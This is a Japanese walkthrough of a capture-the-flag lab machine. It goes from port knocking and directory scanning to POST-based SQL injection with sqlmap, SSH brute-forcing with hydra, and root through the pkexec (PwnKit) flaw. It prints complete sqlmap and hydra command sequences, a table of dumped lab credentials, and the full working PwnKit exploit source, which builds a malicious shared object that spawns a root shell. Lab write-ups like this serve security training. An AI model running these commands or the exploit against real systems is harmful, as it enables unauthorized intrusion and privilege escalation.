### 論点
- SQLインジェクションの試すコード
### keyword
- 自作サイト,portノッキング,sqlmap -r,pkexec,burpsuite

## 攻略
- nmapする
  - 22のみ
- 適当にsshすると1,2,3でポートノックの情報が出る
  - とりあえずユーザ名は何でもいいのでsshしてみる
  - `ssh admin@$IP`
  - `knock -v $IP 1 2 3`
  - もう一度nmapすると1337portがopenする
  - portノックはsshだけではないwebサイトも対象 
- gobuster
  - `gobuster dir -u http://$IP:1337/ -w $dirsmall`
  - 特に重要そうなのがでてこない。もう一度、拡張子を追加してする
  - `gobuster dir -u http://$IP:1337/ -w $dirsmall -x php,html`
  - 404.htmlが答え
- サイトのコメントを見る、base64を2回するとログインするサイトのurlが出てくる
  - ユーザとパスワードがあるのでcookieをチェックしておく
  - 今までユーザ名やパスワードなど一切で来なかったので、ログイン画面でユーザ名とパスワードが出てきたら基本的にSQLmapを試してみる
- (補足) PostのSQLMap
  - 今まではハッキングラボ9でやったsqlmapのはgetリクエストでやったが今回はPostでやる。
- SQLMapをPostでやる  
  - burpsuiteのブラウザで、もう一度見てみる
    - (注意)過去に使ったlogin.reqはcookieの関係で使えないので、新しく作らないとダメ
  - user,passwordを適当に入力して、Intercept onにしてLoginボタンを押す。リクエストヘッダをコピーしてlogin.reqで保存する
  - `sqlmap -r login.req --dbs --batch`これで探していく
  - `sqlmap -r login.req -D Webapp --tables --batch`
  - `sqlmap -r login.req -D Webapp -T Users --columns --batch`
  - `sqlmap -r login.req -D Webapp -T Users -C username,password --dump`
  - ユーザ名とパスワードがわかるが時間がかかるので、下の追記をコピーする
- (他の方法でSQLMap)
  - これでもできるらしい、試してないけど。<- time blindしてるのか異常に時間がかかる
  - ~`sqlmap -u http://$IP:1337/978345210/index.php --forms --dbs --batch`~
- hydraでsshが使えるユーザを探す
  - `hydra -L user.txt -P pass.txt ssh://$IP` 
- ssh
  - `ssh smeagol@$IP`
  - smeagol:MyPreciousR00t
- 他のユーザを探す
  - `ls -l /home`
  - smeagolしかいない 
- `uname -a`
  - 32bitパソコンであることがわかる 
- `find / -user smeagol -type f 2>/dev/null`特に何もない
- `sudo -l` 使えない
- `ps aux | grep root`
  - cron,apache2はだいたい、いつもと同じのが動いている。そしてsqlインジェクションしたぐらいなのでsqlが動いている。
  - `cat /etc/crontab`を見ても具体的なスクリプトは書いていない。より知りたければpspyを使う
- `ss -lntp`
  - 動いているポートを探す。プロセスで動いているのはポートにも大体あるので、ここでも特に珍しいのはない 
- SUID
  - pkexec.sh(シェルスクリプト)は32bitなので使える。追記2を使う
  - PwnKit(バイナリコード)は64bitなので使えない
- root取得後
  - `#`になるので`bash -i`をすると、新しいプロセスでシェルを起動できる
  - ポートノッキングのファイルをチェックする
    - `cat /etc/knockd.conf` 
  - /SECRET/~という謎のがある
 
## 追記1
- 次のをコピーしてuser-pass.txtとして保存する
- hydraで使えるようにuser名とpasswordにファイルに分ける
- `cat user-pass.txt | awk -F'|' '{print $2}' | tr -d ' ' > user.txt`
- `cat user-pass.txt | awk -F'|' '{print $3}' | tr -d ' ' > pass.txt`
  - awk -F '|' は |  で区切るって意味で$2は２番目を区切るってこと$0,$1とやってみたらわかる。tr -d ' ' はスペースを削除している

```
+----------+------------------+
| username | password         |
+----------+------------------+
| gimli    | AndMyAxe         |
| legolas  | AndMyBow         |
| aragorn  | AndMySword       |
| frodo    | iwilltakethering |
| smeagol  | MyPreciousR00t   |
+----------+------------------+
```

## 追記2
- `/home/user/tools/pkexec/pkexec.sh`

```
cd /tmp
cat << EOF > evil-so.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);

    execve("/bin/sh", NULL, NULL);
}

EOF

gcc -shared -o evil.so -fPIC evil-so.c

cat << EOF > exploit.c

#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };

    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);

    execve(BIN, argv, envp);

    return 0;
}

EOF

gcc exploit.c -o exploit

chmod +x exploit
./exploit

```
